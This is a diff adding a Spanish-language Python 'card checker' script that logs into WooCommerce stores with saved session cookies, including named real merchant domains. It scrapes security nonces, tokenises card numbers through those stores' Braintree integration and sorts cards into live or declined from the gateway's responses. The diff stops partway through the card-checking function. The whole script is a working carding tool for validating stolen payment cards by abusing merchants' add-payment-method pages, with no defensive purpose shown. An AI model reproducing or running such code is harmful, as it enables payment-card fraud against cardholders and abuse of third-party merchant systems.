@@ -1,0 +1,912 @@
+import requests, re, json, base64, uuid, urllib3, ssl, time, os, random
+
+# Desactivar advertencias de seguridad
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Colores para la terminal
+class Color:
+    GREEN = '\033[92m'
+    RED = '\033[91m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    BOLD = '\033[1m'
+    RESET = '\033[0m'
+
+# BANNER PERSONALIZADO - Chk ROBERTCHARLY B3s By Bsz Team
+BANNER = f"""
+{Color.CYAN}╔════════════════════════════════════════╗
+{Color.WHITE}          ██████╗██╗  ██╗██╗  ██╗                     
+{Color.WHITE}         ██╔════╝██║  ██║██║ ██╔╝                    
+{Color.WHITE}         ██║     ███████║█████╔╝                      
+{Color.WHITE}         ██║     ██╔══██║██╔═██╗                      
+{Color.WHITE}         ╚██████╗██║  ██║██║  ██╗                     
+{Color.WHITE}          ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝                     
+{Color.MAGENTA}                                                      
+{Color.GREEN}      Chk ROBERTCHARLY B3s By Bsz Team                
+{Color.YELLOW}              CARD CHECKER              
+{Color.CYAN}╚════════════════════════════════════════╝{Color.RESET}
+"""
+
+# Archivos de configuración
+WEBS_FILE = "webs.txt"
+CURRENT_WEB_FILE = "current_web.txt"
+COOKIES_TXT_FILE = "cookies.txt"
+
+def show_banner():
+    """Muestra el banner personalizado"""
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(BANNER)
+    print()
+
+def load_webs():
+    """Carga la lista de webs desde el archivo"""
+    default_webs = ["uavionix.com", "whitmancontrols.com"]
+    
+    if os.path.exists(WEBS_FILE):
+        with open(WEBS_FILE, 'r') as f:
+            webs = [line.strip() for line in f if line.strip()]
+            if webs:
+                return webs
+    
+    with open(WEBS_FILE, 'w') as f:
+        for web in default_webs:
+            f.write(web + '\n')
+    
+    return default_webs
+
+def save_webs(webs):
+    """Guarda la lista de webs en el archivo"""
+    with open(WEBS_FILE, 'w') as f:
+        for web in webs:
+            f.write(web + '\n')
+
+def load_all_cookies():
+    """Carga todas las cookies del archivo cookies.txt y las devuelve como lista"""
+    cookies_list = []
+    if os.path.exists(COOKIES_TXT_FILE):
+        with open(COOKIES_TXT_FILE, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line and '=' in line:
+                    try:
+                        web, cookie_str = line.split('=', 1)
+                        cookies_list.append({
+                            'web': web.strip(),
+                            'cookies': cookie_str.strip()
+                        })
+                    except:
+                        continue
+    return cookies_list
+
+def save_all_cookies(cookies_list):
+    """Guarda todas las cookies en el archivo cookies.txt"""
+    with open(COOKIES_TXT_FILE, 'w') as f:
+        for cookie_item in cookies_list:
+            f.write(f"{cookie_item['web']}={cookie_item['cookies']}\n")
+
+def manage_cookies():
+    """Menú para gestionar cookies"""
+    while True:
+        cookies_list = load_all_cookies()
+        
+        print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+        print(f"{Color.BOLD}{Color.WHITE}GESTIÓN DE COOKIES{Color.RESET}")
+        print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+        
+        if cookies_list:
+            print(f"\n{Color.YELLOW}COOKIES GUARDADAS:{Color.RESET}")
+            for i, cookie_item in enumerate(cookies_list, 1):
+                print(f"{Color.GREEN}[{i}]{Color.RESET} {Color.WHITE}{cookie_item['web']}{Color.RESET}")
+        
+        print(f"\n{Color.CYAN}{'-'*60}{Color.RESET}")
+        print(f"{Color.GREEN}[A]{Color.RESET} {Color.WHITE}Agregar nueva cookie{Color.RESET}")
+        if cookies_list:
+            print(f"{Color.GREEN}[S]{Color.RESET} {Color.WHITE}Seleccionar cookie por número{Color.RESET}")
+            print(f"{Color.GREEN}[E]{Color.RESET} {Color.WHITE}Editar cookie por número{Color.RESET}")
+            print(f"{Color.GREEN}[D]{Color.RESET} {Color.WHITE}Eliminar cookie por número{Color.RESET}")
+        print(f"{Color.GREEN}[V]{Color.RESET} {Color.WHITE}Volver al menú principal{Color.RESET}")
+        print(f"{Color.CYAN}{'='*60}{Color.RESET}")
+        
+        choice = input(f"\n{Color.CYAN}Opción >>> {Color.RESET}").strip().upper()
+        
+        if choice == 'A':
+            add_cookie()
+        elif choice == 'S' and cookies_list:
+            select_cookie_by_number()
+        elif choice == 'E' and cookies_list:
+            edit_cookie_by_number()
+        elif choice == 'D' and cookies_list:
+            delete_cookie_by_number()
+        elif choice == 'V':
+            break
+        else:
+            print(f"{Color.RED}❌ Opción inválida{Color.RESET}")
+            input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+def add_cookie():
+    """Agrega una nueva cookie"""
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}AGREGAR COOKIE{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}\n")
+    
+    print(f"{Color.YELLOW}Ingresa el dominio de la web:{Color.RESET}")
+    web = input(f"{Color.CYAN}Web >>> {Color.RESET}").strip()
+    
+    if not web:
+        print(f"{Color.RED}❌ No se ingresó ninguna web{Color.RESET}")
+        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+        return
+    
+    print(f"\n{Color.YELLOW}Pega las cookies (formato: nombre=valor; nombre2=valor2):{Color.RESET}")
+    cookie_str = input(f"{Color.CYAN}Cookies >>> {Color.RESET}").strip()
+    
+    if not cookie_str:
+        print(f"{Color.RED}❌ No se ingresaron cookies{Color.RESET}")
+        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+        return
+    
+    cookies_list = load_all_cookies()
+    
+    # Verificar si ya existe
+    for i, item in enumerate(cookies_list):
+        if item['web'] == web:
+            print(f"{Color.YELLOW}⚠️  Ya existe una cookie para {web} (Cookie {i+1}){Color.RESET}")
+            overwrite = input(f"{Color.YELLOW}¿Sobrescribir? (S/N): {Color.RESET}").strip().upper()
+            if overwrite != 'S':
+                print(f"{Color.YELLOW}Operación cancelada{Color.RESET}")
+                input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+                return
+            item['cookies'] = cookie_str
+            save_all_cookies(cookies_list)
+            print(f"{Color.GREEN}✓ Cookie {i+1} actualizada para {web}{Color.RESET}")
+            input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+            return
+    
+    cookies_list.append({'web': web, 'cookies': cookie_str})
+    save_all_cookies(cookies_list)
+    print(f"{Color.GREEN}✓ Cookie {len(cookies_list)} agregada para {web}{Color.RESET}")
+    input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+def select_cookie_by_number():
+    """Selecciona una cookie por número"""
+    cookies_list = load_all_cookies()
+    
+    if not cookies_list:
+        print(f"{Color.RED}❌ No hay cookies guardadas{Color.RESET}")
+        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+        return None
+    
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}SELECCIONAR COOKIE POR NÚMERO{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}\n")
+    
+    for i, cookie_item in enumerate(cookies_list, 1):
+        print(f"{Color.GREEN}[{i}]{Color.RESET} {Color.WHITE}{cookie_item['web']}{Color.RESET}")
+    
+    print(f"\n{Color.YELLOW}Selecciona el número de la cookie:{Color.RESET}")
+    
+    try:
+        choice = int(input(f"{Color.CYAN}Número >>> {Color.RESET}").strip())
+        if 1 <= choice <= len(cookies_list):
+            selected = cookies_list[choice-1]
+            with open(CURRENT_WEB_FILE, 'w') as f:
+                f.write(selected['web'])
+            print(f"{Color.GREEN}✓ Has seleccionado la cookie {choice} para: {selected['web']}{Color.RESET}")
+            input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+            return selected['web']
+        else:
+            print(f"{Color.RED}❌ Número inválido (debe ser entre 1 y {len(cookies_list)}){Color.RESET}")
+            input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+            return None
+    except ValueError:
+        print(f"{Color.RED}❌ Entrada inválida. Debe ser un número.{Color.RESET}")
+        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+        return None
+
+def edit_cookie_by_number():
+    """Edita una cookie por número"""
+    cookies_list = load_all_cookies()
+    
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}EDITAR COOKIE POR NÚMERO{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}\n")
+    
+    for i, cookie_item in enumerate(cookies_list, 1):
+        print(f"{Color.GREEN}[{i}]{Color.RESET} {Color.WHITE}{cookie_item['web']}{Color.RESET}")
+    
+    print(f"\n{Color.YELLOW}Selecciona el número de la cookie a editar:{Color.RESET}")
+    
+    try:
+        choice = int(input(f"{Color.CYAN}Número >>> {Color.RESET}").strip())
+        if 1 <= choice <= len(cookies_list):
+            print(f"\n{Color.YELLOW}Editando cookie {choice} para: {cookies_list[choice-1]['web']}{Color.RESET}")
+            print(f"{Color.YELLOW}Ingresa las nuevas cookies (formato: nombre=valor; nombre2=valor2):{Color.RESET}")
+            new_cookies = input(f"{Color.CYAN}Cookies >>> {Color.RESET}").strip()
+            
+            if new_cookies:
+                cookies_list[choice-1]['cookies'] = new_cookies
+                save_all_cookies(cookies_list)
+                print(f"{Color.GREEN}✓ Cookie {choice} actualizada correctamente{Color.RESET}")
+            else:
+                print(f"{Color.YELLOW}No se realizaron cambios{Color.RESET}")
+        else:
+            print(f"{Color.RED}❌ Número inválido (debe ser entre 1 y {len(cookies_list)}){Color.RESET}")
+    except ValueError:
+        print(f"{Color.RED}❌ Entrada inválida. Debe ser un número.{Color.RESET}")
+    
+    input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+def delete_cookie_by_number():
+    """Elimina una cookie por número"""
+    cookies_list = load_all_cookies()
+    
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}ELIMINAR COOKIE POR NÚMERO{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}\n")
+    
+    for i, cookie_item in enumerate(cookies_list, 1):
+        print(f"{Color.GREEN}[{i}]{Color.RESET} {Color.WHITE}{cookie_item['web']}{Color.RESET}")
+    
+    print(f"\n{Color.YELLOW}Selecciona el número de la cookie a eliminar:{Color.RESET}")
+    
+    try:
+        choice = int(input(f"{Color.CYAN}Número >>> {Color.RESET}").strip())
+        if 1 <= choice <= len(cookies_list):
+            confirm = input(f"{Color.YELLOW}¿Estás seguro de eliminar la cookie {choice}? (S/N): {Color.RESET}").strip().upper()
+            if confirm == 'S':
+                deleted = cookies_list.pop(choice-1)
+                save_all_cookies(cookies_list)
+                print(f"{Color.GREEN}✓ Cookie {choice} eliminada para: {deleted['web']}{Color.RESET}")
+                
+                # Si era la web actual, actualizar
+                current = get_current_web()
+                if current == deleted['web'] and cookies_list:
+                    with open(CURRENT_WEB_FILE, 'w') as f:
+                        f.write(cookies_list[0]['web'])
+                    print(f"{Color.YELLOW}Web actual actualizada a: {cookies_list[0]['web']}{Color.RESET}")
+            else:
+                print(f"{Color.YELLOW}Eliminación cancelada{Color.RESET}")
+        else:
+            print(f"{Color.RED}❌ Número inválido (debe ser entre 1 y {len(cookies_list)}){Color.RESET}")
+    except ValueError:
+        print(f"{Color.RED}❌ Entrada inválida. Debe ser un número.{Color.RESET}")
+    
+    input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+def manage_webs():
+    """Menú para gestionar webs"""
+    while True:
+        webs = load_webs()
+        
+        print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+        print(f"{Color.BOLD}{Color.WHITE}GESTIÓN DE WEBS{Color.RESET}")
+        print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+        
+        if webs:
+            print(f"\n{Color.YELLOW}WEBS DISPONIBLES:{Color.RESET}")
+            for i, web in enumerate(webs, 1):
+                print(f"{Color.GREEN}[{i}]{Color.RESET} {Color.WHITE}{web}{Color.RESET}")
+        
+        print(f"\n{Color.CYAN}{'-'*60}{Color.RESET}")
+        print(f"{Color.GREEN}[A]{Color.RESET} {Color.WHITE}Agregar nueva web{Color.RESET}")
+        if webs:
+            print(f"{Color.GREEN}[S]{Color.RESET} {Color.WHITE}Seleccionar web por número{Color.RESET}")
+            print(f"{Color.GREEN}[E]{Color.RESET} {Color.WHITE}Editar web por número{Color.RESET}")
+            print(f"{Color.GREEN}[D]{Color.RESET} {Color.WHITE}Eliminar web por número{Color.RESET}")
+        print(f"{Color.GREEN}[V]{Color.RESET} {Color.WHITE}Volver al menú principal{Color.RESET}")
+        print(f"{Color.CYAN}{'='*60}{Color.RESET}")
+        
+        choice = input(f"\n{Color.CYAN}Opción >>> {Color.RESET}").strip().upper()
+        
+        if choice == 'A':
+            add_web()
+        elif choice == 'S' and webs:
+            select_web_by_number()
+        elif choice == 'E' and webs:
+            edit_web_by_number()
+        elif choice == 'D' and webs:
+            delete_web_by_number()
+        elif choice == 'V':
+            break
+        else:
+            print(f"{Color.RED}❌ Opción inválida{Color.RESET}")
+            input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+def add_web():
+    """Agrega una nueva web"""
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}AGREGAR NUEVA WEB{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}\n")
+    
+    print(f"{Color.YELLOW}Ingresa el dominio de la web (ej: whitmancontrols.com):{Color.RESET}")
+    new_web = input(f"{Color.CYAN}Web >>> {Color.RESET}").strip()
+    
+    if not new_web:
+        print(f"{Color.RED}❌ No se ingresó ninguna web{Color.RESET}")
+        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+        return
+    
+    webs = load_webs()
+    
+    if new_web in webs:
+        print(f"{Color.YELLOW}⚠️  Esta web ya existe{Color.RESET}")
+    else:
+        webs.append(new_web)
+        save_webs(webs)
+        print(f"{Color.GREEN}✓ Web {len(webs)} agregada: {new_web}{Color.RESET}")
+    
+    input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+def select_web_by_number():
+    """Selecciona una web por número"""
+    webs = load_webs()
+    
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}SELECCIONAR WEB POR NÚMERO{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}\n")
+    
+    for i, web in enumerate(webs, 1):
+        print(f"{Color.GREEN}[{i}]{Color.RESET} {Color.WHITE}{web}{Color.RESET}")
+    
+    print(f"\n{Color.YELLOW}Selecciona el número de la web:{Color.RESET}")
+    
+    try:
+        choice = int(input(f"{Color.CYAN}Número >>> {Color.RESET}").strip())
+        if 1 <= choice <= len(webs):
+            selected_web = webs[choice-1]
+            with open(CURRENT_WEB_FILE, 'w') as f:
+                f.write(selected_web)
+            print(f"{Color.GREEN}✓ Has seleccionado la web {choice}: {selected_web}{Color.RESET}")
+        else:
+            print(f"{Color.RED}❌ Número inválido (debe ser entre 1 y {len(webs)}){Color.RESET}")
+    except ValueError:
+        print(f"{Color.RED}❌ Entrada inválida. Debe ser un número.{Color.RESET}")
+    
+    input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+def edit_web_by_number():
+    """Edita una web por número"""
+    webs = load_webs()
+    
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}EDITAR WEB POR NÚMERO{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}\n")
+    
+    for i, web in enumerate(webs, 1):
+        print(f"{Color.GREEN}[{i}]{Color.RESET} {Color.WHITE}{web}{Color.RESET}")
+    
+    print(f"\n{Color.YELLOW}Selecciona el número de la web a editar:{Color.RESET}")
+    
+    try:
+        choice = int(input(f"{Color.CYAN}Número >>> {Color.RESET}").strip())
+        if 1 <= choice <= len(webs):
+            print(f"\n{Color.YELLOW}Editando web {choice}: {webs[choice-1]}{Color.RESET}")
+            print(f"{Color.YELLOW}Ingresa el nuevo dominio:{Color.RESET}")
+            new_web = input(f"{Color.CYAN}Web >>> {Color.RESET}").strip()
+            
+            if new_web:
+                if new_web not in webs:
+                    old_web = webs[choice-1]
+                    webs[choice-1] = new_web
+                    save_webs(webs)
+                    
+                    # Actualizar también en cookies si existe
+                    cookies_list = load_all_cookies()
+                    updated = False
+                    for cookie in cookies_list:
+                        if cookie['web'] == old_web:
+                            cookie['web'] = new_web
+                            updated = True
+                    if updated:
+                        save_all_cookies(cookies_list)
+                    
+                    # Actualizar web actual si era la editada
+                    current = get_current_web()
+                    if current == old_web:
+                        with open(CURRENT_WEB_FILE, 'w') as f:
+                            f.write(new_web)
+                    
+                    print(f"{Color.GREEN}✓ Web {choice} actualizada a: {new_web}{Color.RESET}")
+                else:
+                    print(f"{Color.YELLOW}La web {new_web} ya existe{Color.RESET}")
+            else:
+                print(f"{Color.YELLOW}No se realizaron cambios{Color.RESET}")
+        else:
+            print(f"{Color.RED}❌ Número inválido (debe ser entre 1 y {len(webs)}){Color.RESET}")
+    except ValueError:
+        print(f"{Color.RED}❌ Entrada inválida. Debe ser un número.{Color.RESET}")
+    
+    input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+def delete_web_by_number():
+    """Elimina una web por número"""
+    webs = load_webs()
+    
+    if len(webs) <= 1:
+        print(f"{Color.RED}❌ No puedes eliminar la única web{Color.RESET}")
+        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+        return
+    
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}ELIMINAR WEB POR NÚMERO{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}\n")
+    
+    for i, web in enumerate(webs, 1):
+        print(f"{Color.GREEN}[{i}]{Color.RESET} {Color.WHITE}{web}{Color.RESET}")
+    
+    print(f"\n{Color.YELLOW}Selecciona el número de la web a eliminar:{Color.RESET}")
+    
+    try:
+        choice = int(input(f"{Color.CYAN}Número >>> {Color.RESET}").strip())
+        if 1 <= choice <= len(webs):
+            confirm = input(f"{Color.YELLOW}¿Estás seguro de eliminar la web {choice}? (S/N): {Color.RESET}").strip().upper()
+            if confirm == 'S':
+                deleted = webs.pop(choice-1)
+                save_webs(webs)
+                
+                # También eliminar cookies asociadas
+                cookies_list = load_all_cookies()
+                cookies_list = [c for c in cookies_list if c['web'] != deleted]
+                save_all_cookies(cookies_list)
+                
+                # Actualizar web actual si era la eliminada
+                current = get_current_web()
+                if current == deleted:
+                    with open(CURRENT_WEB_FILE, 'w') as f:
+                        f.write(webs[0])
+                    print(f"{Color.YELLOW}Web actual actualizada a: {webs[0]}{Color.RESET}")
+                
+                print(f"{Color.GREEN}✓ Web {choice} eliminada: {deleted}{Color.RESET}")
+            else:
+                print(f"{Color.YELLOW}Eliminación cancelada{Color.RESET}")
+        else:
+            print(f"{Color.RED}❌ Número inválido (debe ser entre 1 y {len(webs)}){Color.RESET}")
+    except ValueError:
+        print(f"{Color.RED}❌ Entrada inválida. Debe ser un número.{Color.RESET}")
+    
+    input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+def get_current_web():
+    """Obtiene la web actualmente seleccionada"""
+    if os.path.exists(CURRENT_WEB_FILE):
+        with open(CURRENT_WEB_FILE, 'r') as f:
+            web = f.read().strip()
+            if web:
+                return web
+    
+    webs = load_webs()
+    if webs:
+        return webs[0]
+    return "uavionix.com"
+
+def get_cookies_for_web(web):
+    """Obtiene cookies para una web específica"""
+    cookies_list = load_all_cookies()
+    for item in cookies_list:
+        if item['web'] == web:
+            return item['cookies']
+    return None
+
+def parse_cookies(cookie_str):
+    """Convierte string de cookies a diccionario"""
+    cookies = {}
+    for line in cookie_str.strip().split(';'):
+        line = line.strip()
+        if line and '=' in line:
+            try:
+                name, value = line.split('=', 1)
+                cookies[name.strip()] = value.strip()
+            except:
+                continue
+    return cookies
+
+def check_site_compatibility(session, web):
+    """Verifica si el sitio es compatible con el checker"""
+    try:
+        url_add_pm = f"https://{web}/my-account/add-payment-method/"
+        r = session.get(url_add_pm, verify=False, timeout=20, allow_redirects=True)
+        
+        # Verificar si es una página de login
+        if 'wp-login' in r.url or 'login' in r.url:
+            return False, "Se requiere inicio de sesión"
+        
+        # Verificar si hay elementos de WooCommerce/Braintree
+        if 'woocommerce' in r.text.lower() or 'braintree' in r.text.lower():
+            if 'client_token_nonce' in r.text:
+                return True, "Sitio compatible (WooCommerce + Braintree)"
+        
+        return False, "El sitio no es compatible (no se detectó WooCommerce/Braintree)"
+    except Exception as e:
+        return False, f"Error al conectar: {str(e)}"
+
+def check_session(session, web):
+    """Verifica si la sesión está activa y el sitio es compatible"""
+    try:
+        url_add_pm = f"https://{web}/my-account/add-payment-method/"
+        r = session.get(url_add_pm, verify=False, timeout=20, allow_redirects=True)
+        
+        # Verificar si estamos logueados
+        logged_in = 'Log out' in r.text or 'logout' in r.text.lower() or 'my-account' in r.url
+        
+        # Verificar compatibilidad
+        compatible, msg = check_site_compatibility(session, web)
+        
+        return logged_in and compatible
+    except:
+        return False
+
+def initialize_session(web):
+    """Inicializa la sesión con cookies"""
+    cookie_str = load_or_request_cookies(web)
+    
+    s = requests.Session()
+    s.cookies.update(parse_cookies(cookie_str))
+    s.headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "es-ES,es;q=0.9",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1"
+    }
+    
+    print(f"{Color.CYAN}🔍 Verificando sitio {web}...{Color.RESET}")
+    
+    # Primero verificar compatibilidad
+    compatible, msg = check_site_compatibility(s, web)
+    if not compatible:
+        print(f"{Color.RED}❌ {msg}{Color.RESET}")
+        print(f"{Color.YELLOW}El checker solo funciona con sitios WooCommerce que usan Braintree{Color.RESET}")
+        exit(1)
+    
+    print(f"{Color.CYAN}🔍 Verificando sesión...{Color.RESET}")
+    if check_session(s, web):
+        print(f"{Color.GREEN}✓ Sesión activa y válida{Color.RESET}\n")
+        return s, web
+    else:
+        print(f"{Color.RED}❌ Cookies expiradas o sesión no válida{Color.RESET}\n")
+        cookie_str = request_new_cookies(web)
+        s.cookies.update(parse_cookies(cookie_str))
+        
+        if check_session(s, web):
+            print(f"{Color.GREEN}✓ Nuevas cookies funcionando correctamente{Color.RESET}\n")
+            return s, web
+        else:
+            print(f"{Color.RED}❌ Las cookies ingresadas no son válidas o el sitio requiere inicio de sesión{Color.RESET}")
+            print(f"{Color.YELLOW}Asegúrate de: {Color.RESET}")
+            print(f"{Color.YELLOW}1. Haber iniciado sesión en {web}{Color.RESET}")
+            print(f"{Color.YELLOW}2. Copiar las cookies correctamente{Color.RESET}")
+            exit(1)
+
+def load_or_request_cookies(web):
+    """Carga cookies o pide nuevas"""
+    cookie_str = get_cookies_for_web(web)
+    
+    if cookie_str:
+        # Encontrar el número de la cookie
+        cookies_list = load_all_cookies()
+        for i, item in enumerate(cookies_list, 1):
+            if item['web'] == web:
+                print(f"{Color.CYAN}📁 Cargando cookie {i} para {web}...{Color.RESET}")
+                break
+        print(f"{Color.GREEN}✓ Cookie cargada exitosamente{Color.RESET}\n")
+        return cookie_str
+    
+    print(f"{Color.YELLOW}⚠️  No se encontró cookie guardada para {web}{Color.RESET}")
+    return request_new_cookies(web)
+
+def request_new_cookies(web):
+    """Pide nuevas cookies al usuario y las guarda"""
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}INGRESA COOKIES PARA: {web}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}\n")
+
+    print(f"{Color.YELLOW}Pega las cookies (formato: nombre=valor; nombre2=valor2):{Color.RESET}")
+    print(f"{Color.WHITE}Ejemplo: PHPSESSID=abc123; wordpress_logged_in=def456{Color.RESET}\n")
+    
+    cookie_str = input(f"{Color.CYAN}Cookies >>> {Color.RESET}").strip()
+    
+    if not cookie_str:
+        print(f"{Color.RED}❌ No se ingresaron cookies. Saliendo...{Color.RESET}")
+        exit(1)
+    
+    cookies_list = load_all_cookies()
+    
+    # Verificar si ya existe para actualizar
+    for i, item in enumerate(cookies_list):
+        if item['web'] == web:
+            item['cookies'] = cookie_str
+            save_all_cookies(cookies_list)
+            print(f"\n{Color.GREEN}✓ Cookie {i+1} actualizada para {web}{Color.RESET}")
+            print(f"{Color.GREEN}✓ Guardada en cookies.txt{Color.RESET}\n")
+            return cookie_str
+    
+    cookies_list.append({'web': web, 'cookies': cookie_str})
+    save_all_cookies(cookies_list)
+    print(f"\n{Color.GREEN}✓ Cookie {len(cookies_list)} guardada para {web}{Color.RESET}")
+    print(f"{Color.GREEN}✓ Guardada en cookies.txt{Color.RESET}\n")
+    
+    return cookie_str
+
+def check_card(session, web, cc, mm, yy, cvv, index, total):
+    """Verifica una tarjeta individual"""
+    print(f"\n{Color.CYAN}[{index}/{total}] Verificando en {web}: {cc}|{mm}|{yy}|{cvv}{Color.RESET}")
+    
+    try:
+        url_add_pm = f"https://{web}/my-account/add-payment-method/"
+        try:
+            r = session.get(url_add_pm, verify=False, timeout=20)
+        except Exception as e:
+            return {"status": "error", "response": f"Connection error: {str(e)}", "card": f"{cc}|{mm}|{yy}|{cvv}"}
+        
+        if 'Log out' not in r.text:
+            return {"status": "error", "response": "Session expired", "card": f"{cc}|{mm}|{yy}|{cvv}"}
+
+        token_nonce_match = re.search(r'"client_token_nonce":"([^"]+)"', r.text)
+        wc_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', r.text)
+
+        if not token_nonce_match or not wc_nonce_match:
+            return {"status": "error", "response": "No security nonces found", "card": f"{cc}|{mm}|{yy}|{cvv}"}
+
+        token_nonce = token_nonce_match[1]
+        wc_nonce = wc_nonce_match[1]
+
+        ajax_url = f"https://{web}/wp-admin/admin-ajax.php"
+        r_token = session.post(ajax_url, data={
+            'action': 'wc_braintree_credit_card_get_client_token',
+            '_ajax_nonce': token_nonce
+        }, verify=False, timeout=20)
+        
+        try:
+            token = r_token.json()['data']
+            decoded = json.loads(base64.b64decode(token).decode('utf-8'))
+            fingerprint = decoded['authorizationFingerprint']
+            api_url = decoded['clientApiUrl']
+        except:
+            return {"status": "error", "response": "Failed to get Braintree token", "card": f"{cc}|{mm}|{yy}|{cvv}"}
+
+        correlation_id = uuid.uuid4().hex
+        bt_payload = {
+            "creditCard": {
+                "number": cc,
+                "expirationMonth": mm,
+                "expirationYear": yy,
+                "cvv": cvv,
+                "billingAddress": {"postalCode": "10001"}
+            },
+            "authorizationFingerprint": fingerprint,
+            "braintreeLibraryVersion": "braintree/web/3.85.2",
+            "_meta": {"merchantAppId": web, "platform": "web", "sdkVersion": "3.85.2", "source": "form", "deviceFingerprint": correlation_id}
+        }
+        
+        r_bt = requests.post(f"{api_url}/v1/payment_methods/credit_cards", json=bt_payload, verify=False, timeout=20)
+        bt_json = r_bt.json()
+        
+        if 'creditCards' not in bt_json:
+            msg = bt_json.get('errors', [{}])[0].get('message', 'Braintree Declined')
+            return {"status": "declined", "response": msg, "card": f"{cc}|{mm}|{yy}|{cvv}"}
+
+        bt_nonce = bt_json['creditCards'][0]['nonce']
+        card_type = bt_json['creditCards'][0]['type'].lower().replace(' ', '-')
+
+        final_payload = {
+            'payment_method': 'braintree_credit_card',
+            'wc-braintree-credit-card-card-type': card_type,
+            'wc-braintree-credit-card-3d-secure-enabled': '',
+            'wc-braintree-credit-card-3d-secure-verified': '',
+            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+            'wc_braintree_credit_card_payment_nonce': bt_nonce,
+            'wc_braintree_device_data': '{"correlation_id":"' + correlation_id + '"}',
+            'woocommerce-add-payment-method-nonce': wc_nonce,
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'woocommerce_add_payment_method': '1'
+        }
+        
+        r_final = session.post(url_add_pm, data=final_payload, allow_redirects=True, verify=False, timeout=20)
+        
+        if "Payment method successfully added" in r_final.text:
+            return {"status": "approved", "response": "CARD ADDED SUCCESSFULLY", "card": f"{cc}|{mm}|{yy}|{cvv}"}
+        elif "Duplicate card exists in the vault" in r_final.text:
+            return {"status": "approved", "response": "CARD ALREADY EXISTS (LIVE)", "card": f"{cc}|{mm}|{yy}|{cvv}"}
+        else:
+            err_match = re.search(r'class="woocommerce-error"[^>]*>(.*?)</li>', r_final.text, re.DOTALL)
+            msg = re.sub('<[^>]*>', '', err_match[1]).strip() if err_match else "Card declined"
+            
+            cvv_incorrect_keywords = ["CVV", "CVV2", "CVC", "CID", "Security code", "verification"]
+            cvv_incorrect = any(key in msg for key in cvv_incorrect_keywords)
+            
+            live_keywords = ["Insufficient Funds", "2010", "2001", "2046", "C2"]
